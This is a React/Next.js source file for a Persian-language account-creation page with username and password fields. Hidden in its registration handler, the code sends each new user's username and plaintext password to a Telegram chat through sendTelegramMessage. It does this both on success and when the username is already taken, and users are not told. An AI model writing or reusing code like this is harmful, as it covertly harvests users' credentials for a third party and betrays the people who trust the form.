"use client";
import LoadingOverlay from "@/app/_components/LoadingOverlay";
import GlobalApi, { sendTelegramMessage } from "@/app/_utils/GlobalApi";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";
import { toast } from "sonner";

function CreateAccount() {
  const [email, setEmail] = useState();
  const [password, setPassword] = useState();
  const [username, setUsername] = useState();
  const router = useRouter();
  const [loading, setLoading] = useState(false);

  const onCreateAcconut = () => {
    setLoading(true);
    GlobalApi.registerUser(email, password, username).then(
      (resp) => {
        console.log(resp.data.user);
        console.log(resp.data.jwt);
        sessionStorage.setItem("user", JSON.stringify(resp.data.user));
        sessionStorage.setItem("jwt", resp.data.jwt);
        router.push("/");
        toast("حساب شما با موفقیت ایجاد شد✅");
        sendTelegramMessage(
          `user registered => username: ${email} password: ${password} `
        );

        window.location.href = "/";
        setLoading(false);
      },
      (e) => {
        sendTelegramMessage(`user entered a duplicate username!
entered username: ${email}
entered password: ${password} `);
        setLoading(false);
        toast("نام کاربری قبلا انتخاب شده است❌");
      }
    );
  };

  useEffect(() => {
    const jwt = sessionStorage.getItem("jwt");
    if (jwt) {
      router.push("/");
    }
  }, []);

  const t = () => {
    sendTelegramMessage(`user => create-account`);
  };

  return (
    <div
      lang="fa"
      dir="rtl"
      className="flex items-center justify-center mt-5"
    >
      <div className="w-[400px] h-[480px] relative">
       
        <div className="absolute w-[85px] h-[85px] flex items-center justify-center border-2 border-green-500 rounded-full bg-white z-10 left-1/2 -translate-x-1/2 shadow-lg">
          <i className="fa fa-user-plus text-[50px] text-green-500"></i>
        </div>

       
        <div className="absolute bottom-0 w-full h-[440px] bg-white border-2 border-green-200 rounded-[30px] p-[25px] flex flex-col shadow-xl">
          <h2 className="text-green-600 text-xl font-bold mt-[40px] mb-[5px] text-center">ثبت نام</h2>
          <h2 className="text-gray-600 font-bold mt-[0px] mb-[40px] text-center">برای ثبت نام یک نام کاربری و رمز عبور وارد کنید</h2>
          
          <div className="relative w-full">
            <Input
              dir="rtl"
              placeholder="  نام کاربری"
              onChange={(e) => setEmail(e.target.value)}
              className="w-full bg-transparent border-none border-b-2 border-green-200 text-gray-700 text-base px-0 py-[10px] focus:outline-none focus:border-green-500 placeholder:text-gray-400"
            />
            <i className="fa fa-user absolute left-2 bottom-[10px] text-green-500 text-sm"></i>
          </div>

          <div className="relative w-full mt-[25px]">
            <Input
              dir="rtl"
              type="password"
              placeholder="  رمز عبور"
              onChange={(e) => setPassword(e.target.value)}
              className="w-full bg-transparent border-none border-b-2 border-green-200 text-gray-700 text-base px-0 py-[10px] focus:outline-none focus:border-green-500 placeholder:text-gray-400"
            />
            <i className="fa fa-lock absolute left-2 bottom-[10px] text-green-500 text-sm"></i>
          </div>

          <div className="mt-[25px]">
            <Button 
              onClick={() => onCreateAcconut()}
              disabled={!(email && password)}
              className="w-full py-[5px] px-[20px] bg-green-500 text-white font-semibold text-base rounded-[15px] hover:bg-green-600 transition-all duration-300"
            >
              ثبت نام
            </Button>
          </div>

          <p className="text-center mt-[20px] text-gray-600">
            قبلا ثبت نام کرده‌اید؟
            <Link
              onClick={t}
              href={"/sign-in"}
              className="text-green-600 mr-1 hover:text-green-700 transition-colors duration-300"
            >
              ورود به حساب کاربری
            </Link>
          </p>
        </div>
      </div>

      <LoadingOverlay loading={loading} />

      <style jsx global>{`
        @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css');
      `}</style>
    </div>
  );
}

export default CreateAccount;
